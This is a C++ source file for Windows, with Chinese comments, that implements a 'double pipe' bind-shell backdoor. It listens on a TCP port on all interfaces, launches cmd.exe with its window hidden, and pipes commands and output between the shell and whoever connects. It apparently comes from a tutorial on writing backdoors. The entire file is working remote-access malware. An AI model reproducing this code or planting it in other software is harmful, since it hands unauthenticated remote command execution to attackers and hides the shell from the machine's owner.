#include "stdafx.h"
#include "DoublePipe.h"

BOOL SockInit()
{

	WSADATA wsData = { 0 };
	if (WSAStartup(MAKEWORD(2, 2), &wsData) == NO_ERROR)
	{
		return TRUE;
	}
	else {
	
		return FALSE;
	}
	return 0;
}

BOOL StartShell(UINT port)
{
	//初始化socket
	if (!SockInit()) return FALSE;
	//创建socket
	SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (serverSocket == INVALID_SOCKET) return FALSE;
	//绑定指定端口
	sockaddr_in sServer = { 0 };
	sServer.sin_family = AF_INET;
	sServer.sin_addr.s_addr = htonl(INADDR_ANY);
	sServer.sin_port = htons(port);
	if (bind(serverSocket,(sockaddr*) &sServer, sizeof(sServer)) == SOCKET_ERROR)
	{
		return FALSE;
	}
	//开始监听，并且接受连接
	if (listen(serverSocket, 5) == SOCKET_ERROR)
	{
		return FALSE;
	}

	SOCKET cSocket = accept(serverSocket, NULL, NULL);
	//开始创建管道，管道是单向的，所以创建两个管道，
	//一个负责读一个负责写
	
	HANDLE hReadPipe1, hWritePipe1;//管道1 的读写
	HANDLE hReadPipe2, hWritePipe2;//管道2的读写

	SECURITY_ATTRIBUTES sa = { 0 };
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	if (!CreatePipe(&hReadPipe1, &hWritePipe1, &sa, 0) ||
		!CreatePipe(&hReadPipe2, &hWritePipe2, &sa, 0))
		return FALSE;
	//启动cmd.exe，并建立与它的管道通信
	//首先配置启动参数
	STARTUPINFO si = {0};
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	//cmd的标准输入连接到管道1的读取端
	si.hStdInput = hReadPipe1;
	//cmd的标准输出连接到管道2的写入端
	si.hStdOutput = si.hStdError = hWritePipe2;
	//将窗口设置为隐藏
	si.wShowWindow = SW_HIDE;
	//获取cmd.exe的系统路径
	TCHAR tCmdPath[MAX_PATH] = { 0 };
	GetSystemDirectory(tCmdPath, MAX_PATH);//获取系统路径
	lstrcat(tCmdPath, TEXT("\\cmd.exe"));
	//wcscat_s(tCmdPath, MAX_PATH, TEXT("\\cmd.exe"));
	//开始创建cmd进程
	PROCESS_INFORMATION pi = { 0 };
	if (!CreateProcess(tCmdPath,
		NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
		return FALSE;
	//下面开始启动两个线程，一个是读线程,从socket读取数据写入管道1，一个是写线程，从管道2读取数据，写到socket
	ComNode mReadNode, mWriteNode;
	mReadNode.socket = mWriteNode.socket = cSocket;
	mReadNode.pipe = hWritePipe1;
	mWriteNode.pipe = hReadPipe2;
	//接下来启动线程，并将两个通信节点作为参数传到线程处理函数中
	DWORD dwThreadOutput=0, dwThreadInput=0;
	HANDLE hThreadInput = CreateThread(NULL, 0, ThreadInput, &mReadNode, 0, &dwThreadInput);
	HANDLE hThreadOutput = CreateThread(NULL, 0, ThreadOutput, &mWriteNode, 0, &dwThreadOutput);
	

	HANDLE szHandles[] = { hThreadOutput ,hThreadInput };
	//同步线程
	WaitForMultipleObjects(2, szHandles, TRUE, INFINITE);


	return TRUE;
}

DWORD WINAPI ThreadInput(LPVOID lppara)
{
	ComNode mReadNode = *(pComNode)lppara;
	char tBuffer[MAX_PATH] = { 0 };
	while (TRUE)
	{
		DWORD dwWrited = 0;
		DWORD dwRecvd = recv(mReadNode.socket, tBuffer, MAX_PATH, 0);
		if (dwRecvd > 0 && dwRecvd != SOCKET_ERROR) 
		{
			WriteFile(mReadNode.pipe, tBuffer, dwRecvd, &dwWrited, NULL);
		}
		else {
			closesocket(mReadNode.socket);//关闭socket
			mReadNode.socket = INVALID_SOCKET;
			WriteFile(mReadNode.pipe, 
				"exit\r\n", sizeof("exit\r\n"), 
				&dwWrited, NULL);
			return FALSE;
		}
		Sleep(50);
	}
	return TRUE;
}

#define PIPEBUFFERLEN 4096
DWORD WINAPI ThreadOutput(LPVOID lppara)
{
	ComNode mWriteNode = *(pComNode)lppara;
	char cBuffer[PIPEBUFFERLEN] = { 0 };
	char* pBuffer = NULL;

	DWORD dwTotalRead = 0;
	DWORD dwReadedLen = 0;
	BOOL bRet = FALSE;
	while (TRUE)
	{
		if (mWriteNode.socket == INVALID_SOCKET) {
			return FALSE;
		}
		bRet = PeekNamedPipe(mWriteNode.pipe, NULL, 0, NULL, &dwTotalRead, NULL);

		if (bRet&&dwTotalRead > 0)
		{
			//读取管道中的数据，并发送到socket中
			bRet = ReadFile(mWriteNode.pipe, cBuffer, PIPEBUFFERLEN, &dwReadedLen, NULL);
			if (bRet && dwReadedLen > 0)
			{

				DWORD dwSendLen = 0;
				pBuffer = cBuffer;
				do {

					dwSendLen = send(mWriteNode.socket, pBuffer, dwReadedLen, 0);
					pBuffer += dwSendLen;
					dwReadedLen -= dwSendLen;
				
				} while (dwSendLen > 0);
				

			}
		}

		Sleep(50);
		
	}
	return TRUE;
}
